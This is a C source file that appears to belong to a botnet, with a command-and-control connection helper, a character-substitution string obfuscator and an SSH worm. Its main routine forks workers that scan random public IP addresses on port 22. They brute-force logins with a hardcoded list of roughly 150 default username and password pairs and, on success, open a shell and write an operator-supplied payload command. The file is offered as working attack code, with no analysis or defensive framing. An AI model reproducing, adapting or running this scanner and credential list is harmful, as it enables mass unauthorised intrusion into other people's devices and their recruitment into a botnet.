
#ifdef FREEBSD
#define PATH_MAX 260
#endif
#include <dirent.h>
#include <sys/resource.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <limits.h>
#include <stdio.h>
#include <poll.h>
#include <sys/un.h>
#include <stddef.h>
#include <sys/resource.h> //for max fds settings
#ifdef ENEMY
#include <assert.h>
void __assert_fail(const char * assertion, const char * file, unsigned int line, const char * function)
{
    abort();
}
#include "libssh2.h"
#endif
#define packetSized 1024
#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define BUFFER_SIZE 1024
#define PHI 0x9e3779b9
#define SOCKBUF_SIZE 1024
#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))
#if BYTE_ORDER == BIG_ENDIAN
#define HTONS(n) (n)
#define HTONL(n) (n)
#elif BYTE_ORDER == LITTLE_ENDIAN
#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | ((((unsigned long)(n) & 0xff00)) << 8) | ((((unsigned long)(n) & 0xff0000)) >> 8) | ((((unsigned long)(n) & 0xff000000)) >> 24))
#else
#error
#endif
#define INET_ADDR(o1,o2,o3,o4) (HTONL((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define STARTUP
char encodes[] = { 
  '%', 'q', '*', 'K', 'C', ')', '&', 'F', '9', '8', 'f', 's', 'r', '2', 't', 'o', '4', 'b', '3', 'y', 'i', '_', ':', 'w', 'B', '>', 'z', '=', ';', '!', 'k', '?', '"', 'E', 'A', 'Z', '7', '.', 'D', '-', 'm', 'd', '<', 'e', 'x', '5', 'U', '~', 'h', ',', 'j', '|', '$', 'v', '6', 'c', '1', 'g', 'a', '+', 'p', '@', 'u', 'n'
  
};
char decodes[] = { 
  '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
  'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
  'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
  'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' '
};
char decoded[512];

char *decode(char *str)
{
  int x = 0, i = 0, c;

  memset(decoded, 0, sizeof(decoded));
  while(x < strlen(str))
  {
    for(c = 0; c <= sizeof(encodes); c++)
    {
      if(str[x] == encodes[c])
      {
        decoded[i] = decodes[c];
        i++;
      }
    }
    x++;
  }
  decoded[i] = '\0';

  return decoded;
}

unsigned char *fdgets(unsigned char *, int, int);
int initConnection();
void RandString(unsigned char * buf, int length);
int sockprintf(int sock, char * formatStr, ...);
char * inet_ntoa(struct in_addr in );
int fd_cnc = -1, gotIP = 0;
unsigned char ldserver[41]; // EDIT SIZE HERE
uint32_t * pids;
int rangechoice = 1;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {
  0
};



int util_strlen(char *str) {
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}
int util_stristr(char *haystack, int haystack_len, char *str) {
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

void util_memcpy(void *dst, void *src, int len) {
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

int util_strcpy(char *dst, char *src) {
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}
uint32_t getPIP() {
    uint8_t ipState[4] = {
        0
    };
    ipState[0] = rand() % 255;
    ipState[1] = rand() % 255;
    ipState[2] = rand() % 255;
    ipState[3] = rand() % 255;

    while (
        (ipState[0] == 0) ||
        (ipState[0] == 10) ||
        (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
        (ipState[0] == 127) ||
        (ipState[0] == 169 && ipState[1] == 254) ||
        (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
        (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
        (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
        (ipState[0] == 192 && ipState[1] == 168) ||
        (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
        (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
        (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
        (ipState[0] >= 224) && (ipState[0] <= 239) //Multicast ip ranges
    ) {
        ipState[0] = rand() % 255;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
    }

    return INET_ADDR(ipState[0], ipState[1], ipState[2], ipState[3]);
}
int random_number(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand() % (hi_num - low_num)) + low_num;
    return result;
}


void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}
char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}
int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}
int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}
int util_atoi(char *str, int base)
{
  unsigned long acc = 0;
  int c;
  unsigned long cutoff;
  int neg = 0, any, cutlim;

  do {
    c = *str++;
  } while (util_isspace(c));
  if (c == '-') {
    neg = 1;
    c = *str++;
  } else if (c == '+')
    c = *str++;

  cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
  cutlim = cutoff % (unsigned long)base;
  cutoff /= (unsigned long)base;
  for (acc = 0, any = 0;; c = *str++) {
    if (util_isdigit(c))
      c -= '0';
    else if (util_isalpha(c))
      c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
    else
      break;
            
    if (c >= base)
      break;

    if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
      any = -1;
    else {
      any = 1;
      acc *= base;
      acc += c;
    }
  }
  if (any < 0) {
    acc = neg ? LONG_MIN : LONG_MAX;
  } else if (neg)
    acc = -acc;
  return (acc);
}
char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}
int util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return 0;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return 0;
    }

    return 1;
}
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}
/*
char *mygethostbyname(char *hostname) {
  
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, hostname, &(sa.sin_addr));
    if(result != 0) {
    return hostname;
  }
    int sockfd;
    struct addrinfo hints, * servinfo, * p;
    struct sockaddr_in * h;
    int rv;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if ((rv = getaddrinfo(hostname, NULL, &hints,&servinfo)) != 0) {
        return 1;
    }

    // loop through all the results and connect to the first we can
    for (p = servinfo; p != NULL; p = p->ai_next) {
        h = (struct sockaddr_in * ) p->ai_addr;
        return inet_ntoa(h->sin_addr);
    }

    freeaddrinfo(servinfo); // all done with this structure
    return 0;
}*/
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (uint32_t)(t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}
void trim(char * str) {
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (util_isspace(str[begin])) begin++;
  while ((end >= begin) && util_isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}
static void printchar(unsigned char * * str, int c) {
  if (str) { * * str = c;
    ++( * str);
  } else(void) write(1, & c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
  register int pc = 0, padchar = ' ';
  if (width > 0) {
    register int len = 0;
    register
    const unsigned char * ptr;
    for (ptr = string; * ptr; ++ptr) ++len;
    if (len >= width) width = 0;
    else width -= len;
    if (pad & PAD_ZERO) padchar = '0';
  }
  if (!(pad & PAD_RIGHT)) {
    for (; width > 0; --width) {
      printchar(out, padchar);
      ++pc;
    }
  }
  for (; *string; ++string) {
    printchar(out, *string);
    ++pc;
  }
  for (; width > 0; --width) {
    printchar(out, padchar);
    ++pc;
  }

  return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints (out, print_buf, width, pad);
    }

    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN-1;
    *s = '\0';

    while (u) {
        t = u % b;
        if( t >= 10 )
        t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if( width && (pad & PAD_ZERO) ) {
        printchar (out, '-');
        ++pc;
        --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
register int width, pad;
register int pc = 0;
unsigned char scr[2];
for (; *format != 0; ++format) {
if (*format == '%') {
++format;
width = pad = 0;
if (*format == '\0') break;
if (*format == '%') goto out;
if (*format == '-') {
++format;
pad = PAD_RIGHT;
}
while (*format == '0') {
++format;
pad |= PAD_ZERO;
}
for ( ; *format >= '0' && *format <= '9'; ++format) {
width *= 10;
width += *format - '0';
}
if( *format == 's' ) {
register char *s = (char *)va_arg( args, intptr_t );
pc += prints (out, s?s:"(null)", width, pad);
continue;
}
if( *format == 'd' ) {
pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
continue;
}
if( *format == 'x' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
continue;
}
if( *format == 'X' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
continue;
}
if( *format == 'u' ) {
pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
continue;
}
if( *format == 'c' ) {
scr[0] = (unsigned char)va_arg( args, int );
scr[1] = '\0';
pc += prints (out, scr, width, pad);
continue;
}
}
else {
out:
printchar (out, *format);
++pc;
}
}
if (out) **out = '\0';
va_end( args );
return pc;
}

int zprintf(const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print(0, format, args);
}

int szprintf(unsigned char * out,
  const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print( & out, format, args);
}

int sockprintf(int sock, char * formatStr, ...) {
  unsigned char * textBuffer = malloc(2048);
  memset(textBuffer, 0, 2048);
  char * orig = textBuffer;
  va_list args;
  va_start(args, formatStr);
  print(&textBuffer, formatStr, args);
  va_end(args);
  orig[strlen(orig)] = '\n';
  int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
  free(orig);
  return q;
}


int getHost(unsigned char * toGet, struct in_addr * in) {
    struct hostent *he;
    struct in_addr **addr_list;
        
    if ( (he = gethostbyname( toGet ) ) == NULL) 
    {
       if ((in->s_addr = inet_addr(toGet)) == -1) return 1; // gethostbyname failed, is ip address
    } else {
        *in = *((struct in_addr*) he->h_addr_list[0]);
    }
    return 0;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
struct sockaddr_in dest_addr;
fd_set myset;
struct timeval tv;
socklen_t lon;

int valopt;
long arg = fcntl(fd, F_GETFL, NULL);
arg |= O_NONBLOCK;
fcntl(fd, F_SETFL, arg);

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = HTONS(port);
if(getHost(host, &dest_addr.sin_addr)) return 0;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

if (res < 0) {
if (errno == EINPROGRESS) {
tv.tv_sec = timeout;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(fd, &myset);
if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
lon = sizeof(int);
getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if (valopt) return 0;
}
else return 0;
}
else return 0;
}

arg = fcntl(fd, F_GETFL, NULL);
arg &= (~O_NONBLOCK);
fcntl(fd, F_SETFL, arg);

return 1;
}


int mytoupper(int ch)
{
        if(ch >= 'a' && ch <= 'z')
                return ('A' + ch - 'a');
        else
                return ch;
}
void uppercase(unsigned char * str) {
  while ( * str) { * str = mytoupper( * str);
    str++;
  }
}

void RandString(unsigned char * buf, int length) {
  int i = 0;
  for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}
int recvLine(unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        fd_set errors;
        struct timeval tv;
        tv.tv_sec = 7;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_ZERO(&errors);
        FD_SET(fd_cnc, &myset);
        FD_SET(fd_cnc, &errors);
        int selectRtn, retryCount, dataAvailable;
        if ((selectRtn = select(fd_cnc+1, &myset, NULL, &errors, &tv)) <= 0) {
                if(FD_ISSET(fd_cnc, &errors)) return -1;
                while(retryCount < 10)
                {
                        sockprintf(fd_cnc, "PING");
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_ZERO(&errors);
                        FD_SET(fd_cnc, &myset);
                        FD_SET(fd_cnc, &errors);
                        if ((selectRtn = select(fd_cnc+1, &myset, NULL, &errors, &tv)) <= 0) {
                                if(FD_ISSET(fd_cnc, &errors)) return -1;
                                retryCount++;
                                continue;
                        }
                        if(FD_ISSET(fd_cnc, &errors)) return -1;
                        break;
                }
        }

        if(FD_ISSET(fd_cnc, &errors)) return -1;
        ioctl(fd_cnc, FIONREAD, &dataAvailable);
        if(dataAvailable) {
            unsigned char tmpchr;
            unsigned char *cp;
            int count = 0;

            cp = buf;
            while(bufsize-- > 1)
            {
                    if(recv(fd_cnc, &tmpchr, 1, 0) == 0) {
                            *cp = 0x00;
                            return -1;
                    }
                    *cp++ = tmpchr;
                    if(tmpchr == '\n') break;
                    count++;
            }
            *cp = 0x00;

//      zprintf("recv: %s\n", cp);
    
            return count;
        } else {
            return 0;
        }
}
int listFork() {
  uint32_t parent, * newpids, i;
  parent = fork();
  if (parent <= 0) return parent;
  numpids++;
  newpids = (uint32_t * ) malloc((numpids + 1) * 4);
  for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
  newpids[numpids - 1] = parent;
  free(pids);
  pids = newpids;
  return parent;
}

in_addr_t GetRandomIP(in_addr_t netmask) {
  in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
  return tmp ^ (rand_cmwc() & ~netmask);
}

unsigned short csum(unsigned short * buf, int count) {
  register uint64_t sum = 0;
  while (count > 1) {
    sum += * buf++;
    count -= 2;
  }
  if (count > 0) {
    sum += * (unsigned char * ) buf;
  }
  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }
  return (uint16_t)(~sum);
}
/* Copyright (C) 1991,92,93,95,96,97,98,99,2000 Free Software Foundation, Inc.
   This file is part of the GNU C Library.
   The GNU C Library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 2.1 of the License, or (at your option) any later version.
   The GNU C Library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.
   You should have received a copy of the GNU Lesser General Public
   License along with the GNU C Library; if not, write to the Free
   Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
   02111-1307 USA.  */
#include <sys/types.h>
#include <netinet/in.h>
struct timestamp
  {
    uint8_t len;
    uint8_t ptr;
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int flags:4;
    unsigned int overflow:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int overflow:4;
    unsigned int flags:4;
#else
# error "Please fix <bits/endian.h>"
#endif
    uint32_t data[9];
  };
struct iphdr
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ihl:4;
    unsigned int version:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int version:4;
    unsigned int ihl:4;
#else
# error "Please fix <bits/endian.h>"
#endif
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
    /*The options start here. */
  };
struct ip
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ip_hl:4;   /* header length */
    unsigned int ip_v:4;    /* version */
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int ip_v:4;    /* version */
    unsigned int ip_hl:4;   /* header length */
#endif
    uint8_t ip_tos;     /* type of service */
    u_short ip_len;     /* total length */
    u_short ip_id;      /* identification */
    u_short ip_off;     /* fragment offset field */
#define IP_RF 0x8000      /* reserved fragment flag */
#define IP_DF 0x4000      /* dont fragment flag */
#define IP_MF 0x2000      /* more fragments flag */
#define IP_OFFMASK 0x1fff   /* mask for fragmenting bits */
    uint8_t ip_ttl;     /* time to live */
    uint8_t ip_p;     /* protocol */
    u_short ip_sum;     /* checksum */
    struct in_addr ip_src, ip_dst;  /* source and dest address */
  };
/*
 * Time stamp option structure.
 */
struct ip_timestamp
  {
    uint8_t ipt_code;     /* IPOPT_TS */
    uint8_t ipt_len;      /* size of structure (variable) */
    uint8_t ipt_ptr;      /* index of current entry */
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ipt_flg:4;   /* flags, see below */
    unsigned int ipt_oflw:4;    /* overflow counter */
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int ipt_oflw:4;    /* overflow counter */
    unsigned int ipt_flg:4;   /* flags, see below */
#endif
    uint32_t data[9];
  };
/*
 * User-settable options (used with setsockopt).
 */
#define TCP_NODELAY  1  /* Don't delay send to coalesce packets  */

typedef uint32_t tcp_seq;
/*
 * TCP header.
 * Per RFC 793, September, 1981.
 */
int checkauth(char *username, char *password, char *host, char* payload)
{

  LIBSSH2_CHANNEL *channel;
  int rc;
 
 
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = HTONS(22);
    sin.sin_addr.s_addr = inet_addr(host);
    if(connect(sock, (struct sockaddr*)(&sin),
                sizeof(struct sockaddr_in)) != 0) {
 //       // fprintf(stdout, "failed to connect!\n");
        return 1; //break out of brute loop and save time
    }
 
    LIBSSH2_SESSION *session = libssh2_session_init();

    libssh2_session_set_blocking(session, 0);

    while((rc = libssh2_session_handshake(session, sock)) ==
           LIBSSH2_ERROR_EAGAIN);
    if(rc) {
#ifdef SSHDEBUG
        fprintf(stderr, "Failure establishing SSH session: %d\n", rc);
#endif
        return 1;
    }


 
    while((rc = libssh2_userauth_password(session, username, password)) ==
          LIBSSH2_ERROR_EAGAIN);
    if(rc) {
#ifdef SSHDEBUG
    fprintf(stdout, "FAILED LOGIN! -> %s:22 %s:%s\n", host, username, password);
#endif
        return -1;
    }

#ifdef SSHDEBUG
    fprintf(stdout, "SUCCESSFUL SSH LOGIN! -> %s:22 %s:%s\n", host, username, password);
#endif

    while((channel = libssh2_channel_open_session(session)) == NULL &&
          libssh2_session_last_error(session, NULL, NULL, 0) ==
          LIBSSH2_ERROR_EAGAIN) {
        waitsocket(sock, session);
    }
    libssh2_session_set_blocking(session, 1);

    if(libssh2_channel_request_pty(channel, "vt100")) {
#ifdef SSHDEBUG
        fprintf(stderr, "Failed requesting pty\n");
#endif
        goto skip_shell;
    }

    if(libssh2_channel_shell(channel)) {        
#ifdef SSHDEBUG
        fprintf(stderr, "Unable to request shell on allocated pty\n");
#endif
        goto shutdown;
    }
    libssh2_session_set_blocking(session, 0);

    char rekdevice[512];
    memset(rekdevice, 0, sizeof(rekdevice));
    sprintf(rekdevice, payload);
   // printf("%s", rekdevice);
    int bufsize = strlen(rekdevice);
    int totwritten = 0;
    if(totwritten < bufsize) {
        int left = bufsize - totwritten;
        int size = (left < bufsize) ? left : bufsize;
        int n = libssh2_channel_write_ex(channel, 0, rekdevice, bufsize);
        if(n < 0) {
            return 1; //fail
        }
        else {
            totwritten += n;
        }
    }
    libssh2_channel_flush(channel);
    libssh2_channel_send_eof(channel);
    sleep(1);
#ifdef SSHDEBUG
    fprintf(stdout, "SUCCESSFUL SSH HACK! -> %s:22 %s:%s\n", host, username, password);
#endif
 
  skip_shell:
    if(channel) {
        libssh2_channel_free(channel);

        channel = NULL;
    }
 
  shutdown:
 
    if(session) {
        libssh2_session_disconnect(session, "");
        libssh2_session_free(session);

    }
    return 2;
}
#define __MAX_SSH_FORKS 8 //DONT CHANGE THIS LOL
#define __MAX_SSH_FDS 12 //DONT CHANGE THIS LOL
int main(int agrc, char* argv[]) {
    int f;
    FILE*fp = fopen(argv[1], "w");
    for(f = 0; f < __MAX_SSH_FORKS; f++) {
        pid_t pid;
        pid = fork();
        if (pid < 0) {
            return;
        }
        if(pid == 0) {
            struct rlimit old;
            if (getrlimit(RLIMIT_NOFILE, &old) != -1) { old.rlim_cur = old.rlim_max; setrlimit(RLIMIT_NOFILE, &old); } //SET MAX FILE DESCRIPTORS CROSS PLATFORM
            int v, k, mode;
            char *passlist[] = {"root", "root", "root", "admin", "admin", "admin", "admin", "1234", "ubnt", "ubnt", "root", "toor", "user", "user", "support", "support", "admin", "password", "admin", "1234567890", "root", "1234", "root", "abc123", "vagrant", "vagrant", "CISCO", "CISCO", "netgear", "netgear", "root", "openelec", "osm", "osmpassword", "osmc", "osmc", "root", "letmein", "admin", "letmein", "operator", "operator", "user", "123456", "service", "service", "root", "linux", "root", "password", "test", "test", "admin", "admin123", "admin", "12345", "root", "calvin","administrator", "password","NetLinx", "password","administrator", "Amx1234!","amx", "password","amx", "Amx1234!","admin", "1988","admin", "admin","Administrator", "Vision2","cisco", "cisco","c-comatic", "xrtwk318","root", "qwasyx21","admin", "insecure","pi", "raspberry","user", "user","root", "default","root", "leostream","leo", "leo","localadmin", "localadmin","fwupgrade", "fwupgrade","root", "rootpasswd","admin", "password","root", "timeserver","admin", "motorola","cloudera", "cloudera","root", "p@ck3tf3nc3","apc", "apc","device", "apc","eurek", "eurek","netscreen", "netscreen","admin", "avocent","root", "linux","sconsole", "12345","root", "5up","cirros", "cubswin:)","root", "uClinux","root", "alpine","root", "dottie","root", "arcsight","root", "unitrends1","vagrant", "vagrant","root", "vagrant","m202", "m202","demo", "fai","root", "fai","root", "ceadmin","maint", "password","root", "palosanto","root", "ubuntu1404","root", "cubox-i","debian", "debian","root", "debian","root", "xoa","root", "sipwise","debian", "temppwd","root", "sixaola","debian", "sixaola","myshake", "shakeme","stackato", "stackato","root", "screencast","root", "stxadmin","root", "nosoup4u","root", "indigo","root", "video","default", "video","default", "","ftp", "video","nexthink", "123456","ubnt", "ubnt","root", "ubnt","sansforensics", "forensics","elk_user", "forensics","osboxes", "osboxes.org","root", "osboxes.org","sans", "training","user", "password","misp", "Password1234","hxeadm", "HXEHana1","acitoolkit", "acitoolkit","osbash", "osbash","enisa", "enisa","geosolutions", "Geos","pyimagesearch", "deeplearning","root", "NM1$88","remnux", "malware","hunter", "hunter","plexuser", "rasplex","root", "openelec","root", "rasplex","root", "plex","root", "openmediavault","root", "ys123456","root", "libreelec","openhabian", "openhabian","admin", "ManagementConsole2015","public", "publicpass","admin", "hipchat","nao", "nao","support", "symantec","root", "max2play","admin", "pfsense","root", "root01","root", "nas4free","USERID", "PASSW0RD","Administrator", "p@ssw0rd","root", "freenas","root", "cxlinux","admin", "symbol","admin", "Symbol","admin", "superuser","admin", "admin123","root", "D13HH[","root", "blackarch","root", "dasdec1","root", "7ujMko0admin","root", "7ujMko0vizxv","root", "Zte521","root", "zlxx.","root", "compass","hacker", "compass","samurai", "samurai","ubuntu", "ubuntu","root", "openvpnas","misp", "Password1234","root", "wazuh","student", "password123","root", "roottoor","centos", "reverse","root", "reverse","zyfwp", "PrOw!aN_fXp", "root", "root123", "root", "12345", "root", "juantech", "admin1", "password", "vodafone", "vodafone", "admin", "switch", "root", "123456", "admin", "changeme", "root", "cms500", "root", "oelinux123", "root", "vtech", "root", "zte9x15", "root", "antslq", "root", "Password", "root", "qwerty", "root", "pi", "pi", "raspberry"};
            char rekdevice[512];
            srand(time(NULL) ^ rand_cmwc() ^ getpid() + __MAX_SSH_FORKS);
            while (1) {
                struct ssh_fds *fds = calloc(__MAX_SSH_FDS, sizeof(struct ssh_fds));
                memset(fds, 0, sizeof(fds));
                for(mode = 0; mode < 3; mode++) {
                   for(k = 0; k < __MAX_SSH_FDS; k++) {
                        if(mode == 0) {
                            struct sockaddr_in address;
                            memset(&address, 0, sizeof(address));
                            address.sin_family = AF_INET;
                            address.sin_addr.s_addr = getPIP();
                            sprintf(fds[k].ip, "%s", inet_ntoa(address.sin_addr));
                            address.sin_port = HTONS(22);
                            fds[k].sock = socket(AF_INET, SOCK_STREAM, 0);
                            fcntl(fds[k].sock, F_SETFL, O_NONBLOCK);
                            connect(fds[k].sock, (struct sockaddr *)&address, sizeof(address));
                        } else {
                            if(fds[k].sock<=0) continue;
                            struct pollfd pfd[1];
                            pfd[0].fd = fds[k].sock;
                            pfd[0].events = POLLOUT;
                            if (poll(pfd, 1, 12) > 0)
                            {
                                for(v = 0; v < NUMITEMS(passlist); v+=2) {
                                    if(checkauth(passlist[v], passlist[v+1], fds[k].ip, argv[2])>0) break;
                                }
                                fds[k].sock = -1;
                            }
                        }
                    }
                }
            }
        }
    }
}
struct ssh_fds {
    uint16_t port;
    int sock;
    char ip[16];
};
 int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
{

    struct timeval timeout;
    int rc;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd = NULL;
    int dir;
 
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
 
    FD_ZERO(&fd);
 
    FD_SET(socket_fd, &fd);
 
    dir = libssh2_session_block_directions(session);

 
    if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
        readfd = &fd;
 
    if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
        writefd = &fd;
 
    rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);
 
    return rc;
}
